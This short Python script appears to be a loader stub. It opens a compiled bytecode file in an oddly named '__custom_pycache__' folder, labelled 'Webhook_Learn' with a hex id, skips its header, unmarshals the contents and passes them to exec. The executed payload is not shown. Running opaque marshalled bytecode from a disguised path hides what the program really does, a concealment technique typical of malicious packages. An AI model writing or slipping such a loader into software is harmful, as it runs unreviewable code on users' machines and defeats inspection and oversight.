
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Webhook_Learn_fc3c8c7ab2ed4cf7be170651e729565b.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
